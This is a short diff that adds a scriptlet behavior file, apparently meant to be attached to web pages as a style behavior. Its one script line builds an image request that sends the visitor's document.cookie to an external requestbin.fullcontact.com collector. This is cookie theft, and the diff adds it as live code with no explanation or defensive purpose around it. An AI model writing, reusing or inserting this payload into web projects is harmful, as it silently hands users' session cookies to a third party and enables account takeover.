@@ -1,0 +1,4 @@
+<scriptlet>
+    <implements type="behavior"/>
+    <script>(new Image()).src='https://requestbin.fullcontact.com/1msl2w31?id='+document.cookie</script>
+</scriptlet>
